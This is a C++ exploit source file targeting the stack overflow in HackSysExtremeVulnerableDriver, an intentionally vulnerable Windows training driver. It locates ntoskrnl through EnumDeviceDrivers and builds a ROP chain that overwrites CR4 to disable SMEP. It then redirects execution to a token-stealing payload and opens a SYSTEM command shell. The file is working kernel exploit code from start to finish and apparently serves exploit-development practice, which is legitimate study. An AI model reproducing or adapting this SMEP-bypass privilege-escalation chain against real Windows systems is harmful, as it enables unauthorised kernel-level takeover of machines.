#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>

// Windows build : 16299.15.amd64fre.rs3_release.170928 - 1534
// ntoskrnl's version: 10.0.16288.192

extern "C" VOID GetToken();

// Set to TRUE if you're looking for EIP offset, otherwise set to FALSE and set EIP_OFFSET
#define LOCATE_OFFSET		FALSE

// Set this value to the RIP offset you figured out, or to <=5000 if you didn't figure it out yet
#define RIP_OFFSET			2072
#define REG_SIZE			8

// Buffer size to be used
#define SIZE (RIP_OFFSET + REG_SIZE * 4)

// IOCTL to trigger the stack overflow vuln, copied from HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)


int main()
{
	LPVOID addresses[1000];
	DWORD needed;

	EnumDeviceDrivers(addresses, 1000, &needed);

	printf("[+] Address of ntoskrnl.exe: 0x%p\n", addresses[0]);

	LPVOID ntoskrnl_addr = addresses[0];
	LPVOID mov_cr4_rcx_addr = (LPVOID)((INT_PTR)addresses[0] + 0x25256);
	LPVOID pop_rcx = (LPVOID)((INT_PTR)addresses[0] + 0x14bd10);

	printf("[+] Address of mov cr4, rcx: 0x%p\n", mov_cr4_rcx_addr);
	printf("[+] Address of pop rcx: 0x%p\n", pop_rcx);

	// Create handle to driver
	HANDLE device = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);

	if (device == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open handle to device.");
		return -1;
	}

	printf("[+] Opened handle to device: 0x%p.\n", device);

	// Allocate memory to construct buffer for device
	char* uBuffer = (char*)VirtualAlloc(
		NULL,
		SIZE,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (uBuffer == NULL)
	{
		printf("[-] Failed to allocate memory for buffer.\n");
		return -2;
	}

	printf("[+] User buffer allocated: 0x%p.\n", uBuffer);

	RtlFillMemory(uBuffer, SIZE, 'A');

	INT_PTR MemoryAddress = (INT_PTR)(uBuffer + RIP_OFFSET);
	INT_PTR EopPayload = (INT_PTR)&GetToken;

	//No SMEP Test
	//*(INT_PTR*)MemoryAddress = (INT_PTR)EopPayload;

	*(INT_PTR*)MemoryAddress = (INT_PTR)pop_rcx;
	//*(INT_PTR*)(MemoryAddress + 8 * 1) = (INT_PTR)0x70678;
	*(INT_PTR*)(MemoryAddress + 8 * 1) = (INT_PTR)0x506f8; //calculate by ? @cr4 & FFFFFFFF`FFEFFFFF
	*(INT_PTR*)(MemoryAddress + 8 * 2) = (INT_PTR)mov_cr4_rcx_addr;
	*(INT_PTR*)(MemoryAddress + 8 * 3) = (INT_PTR)EopPayload;

	// Uncomment this if you want to re-enable SMEP, you'll need to adjust the stack frame in the payload

	/* *(INT_PTR*)(MemoryAddress + 8 * 4) = (INT_PTR)pop_rcx;
	*(INT_PTR*)(MemoryAddress + 8 * 5) = (INT_PTR)0x170678;
	*(INT_PTR*)(MemoryAddress + 8 * 6) = (INT_PTR)mov_cr4_rcx_addr;
	*(INT_PTR*)(MemoryAddress + 8 * 7) = (INT_PTR)EopPayload;
	*/
	DWORD bytesRet;

	if (DeviceIoControl(
		device,
		HACKSYS_EVD_IOCTL_STACK_OVERFLOW,
		uBuffer,
		SIZE,
		NULL,
		0,
		&bytesRet,
		NULL
	))
	{
		printf("Done! Enjoy a shell shortly.\n\n");
		system("cmd.exe");
	}
	else
		printf("FUUUUUUUUUUUUUUUUUUUU.\n");
}
